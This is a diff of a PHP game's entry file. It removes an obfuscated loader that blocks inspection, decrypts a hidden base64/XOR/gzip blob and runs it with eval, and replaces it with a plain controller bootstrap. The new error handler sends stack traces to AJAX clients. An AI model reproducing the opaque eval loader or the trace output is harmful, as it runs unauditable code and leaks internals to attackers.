@@ -1,24 +1,63 @@
 <?php
-$ppjikdpheit="8bf636e4c7be3e92ee533d5258122236";
-$dgvoubg="0006520e51055d0355520151565c0f530456030501025054070b570a53030157";
-$mwgdyts="QL6BbY1d4wEmmg30ikkzXSl5Kh3JskcjMDvPotu536023lVNIwPq7lCk8y4sFMDbXeGoVB2wRoNqurFZeIEjEZCUSoSZ7mehjnVp1w2lyamTwvNGrtWJmkjLR7eb0X7s8Y9aHy9SbmCjJAiVIeM9j+VlRvG/dA8Ps5h0rBeTcmp/BGPCbIeqLAatRpRU4+4PRt/6Vpfrxj1D/ZTRFQO3vhkDY+EWpb+YxayXhYVFBNt7bVh5DnHEYoHbhJB1h6Ad+37B/FQJtjXv5oSasbr3zupfojmcuDh3y+KCdV8sPR72uniYP7yI6Cl6HDMKvs9EBSCuerVy14ogjevNS24sx5dqlejVA+L7SN13xDLViUG93m78MGP6P/W+7YWmEHM41dDghCZwqH0E256rZ4cit8C6IYMYJL+EbBLfjWhN2xcE7SpdFhLuRzw0NWGWQMIbGk31G4A0ffTibKNXUBfas980xrroFaXwxZcTqqnU96iBk6HMHrbq14UNARQoUTIwAnyQhMjhEGc770Yet1CrwO5LXQjrPHBtunrEsrrbc7W/4kUHvn/Y8t9Mf9uNwlOxtHVbA+6JiX6mZ8+HQzrl3PGeskylfOwKTt5zJmzrTFyRP21RG1aB+MVCKVeRQ2LMkrJ31+bk/0d7pNRFNafaMJ+WIDAp3UiVyRXFY0jiuC3HY/VH5YF6VOUw0DPT5+SeBHREg56fdz9Rw73Ow3OZ5GC+gOGdNUycffFZoYcfi7InpbrmZpqvv02NlmSkPo+QNPEDYrceFMPoNWoT3S2JQCluzrkCeabWQB96WZ0537gv5i+AwlunXNPp9eZSV1twHTiAUUSYcXWmC9XhlF+DcmmJHoS54CHY/N5mKvgwY4Nbu9i3VB/U5ApscWDkwOKiZflOjmkjFsUVe9HDvHaXDbCJyIDXhpgKAF0gRDrI8JsxuVcvm8b/v0mDiNy26uw+wCxiR9YfxxR15P0yLrHYJrKCXXFdaJWVMYsdVdTr1i54mbSEIxkJA0x20BaJyINwpPr1uim4xQp2RXrwWAUMOsMoJ6p4UiuQo/022V53bJq7qPqkkzxv5fRaXpXdL1geZaa0nBVBrjaqDJmYdmOtIXxph3dD15rsz2+bWEnQ";
-$zwrullwgx=file_get_contents(__FILE__);
-$nhsbdkpw=str_replace($mwgdyts,"",$zwrullwgx);
-if(strpos($nhsbdkpw,"ec"."ho")!==false||strpos($nhsbdkpw,"pr"."int")!==false||strpos($nhsbdkpw,"var_"."dump")!==false||strpos($nhsbdkpw,"file_put_"."contents")!==false||strpos($nhsbdkpw,"fw"."rite")!==false){die();}
-$aanlhelveq=str_replace(array($ppjikdpheit,$dgvoubg),array("SP_8157e2b7","KP_62458b13"),$zwrullwgx);
-$glxptc=md5($aanlhelveq);
-$qhgimfb=hex2bin($dgvoubg);
-$efsgfiow="";
-$hbugwga=strlen($glxptc);
-for($zsnigki=0;$zsnigki<$hbugwga;$zsnigki++){
-$efsgfiow.=chr(ord($qhgimfb[$zsnigki])^ord($glxptc[$zsnigki]));
+define('NEW_ENGINE_ACTIVE', true);
+// Suppress deprecation warnings and notices - show only real errors
+error_reporting(E_ERROR | E_PARSE | E_CORE_ERROR | E_COMPILE_ERROR);
+ini_set('display_errors', '0');
+/*****************************************/
+/*     GAME.PHP - MODERNIZADO            */
+/*     100% FIEL AO ORIGINAL             */
+/*     PHP 7+/8+ com MySQLi              */
+/*             ice41                     */
+/*****************************************/
+
+session_start();
+
+// Autoloader
+spl_autoload_register(function ($class) {
+    $prefix = 'App\\';
+    $base_dir = __DIR__ . '/../app/';
+
+    $len = strlen($prefix);
+    if (strncmp($prefix, $class, $len) !== 0) {
+        return;
+    }
+
+    $relative_class = substr($class, $len);
+    $file = $base_dir . str_replace('\\', '/', $relative_class) . '.php';
+
+    if (file_exists($file)) {
+        require $file;
+    }
+});
+
+require_once(__DIR__ . '/../app/Helpers/helpers.php');
+require_once(__DIR__ . '/../app/Helpers/language_helper.php');
+require_once('configs/config.php');
+require_once('modelo/lib/world_constants.php');
+require_once('modelo/lib/config.php');
+require_once('modelo/lib/functions.php');
+require_once('modelo/lib/bonus.php');
+
+// Initialize localization
+init_locale();
+
+// Instanciar GameController
+use App\Controllers\GameController;
+
+try {
+    $controller = new GameController();
+    $controller->index();
+} catch (Exception $e) {
+    // If it's an AJAX request, return JSON error
+    if (isset($_GET['ajax'])) {
+        header('Content-Type: application/json');
+        echo json_encode([
+            'success' => false,
+            'error' => $e->getMessage(),
+            'trace' => $e->getTraceAsString()
+        ]);
+        exit;
+    }
+
+    die('Erro crítico: ' . $e->getMessage());
 }
-$lsfknno=base64_decode($mwgdyts);
-$fpvudyf=strlen($lsfknno);
-$qnujwb="";
-$ulnmpjic=strlen($efsgfiow);
-for($zsnigki=0;$zsnigki<$fpvudyf;$zsnigki++){
-$qnujwb.=$lsfknno[$zsnigki]^$efsgfiow[$zsnigki%$ulnmpjic];
-}
-$aeiwjyxi="gzun"."compress";
-eval($aeiwjyxi($qnujwb));
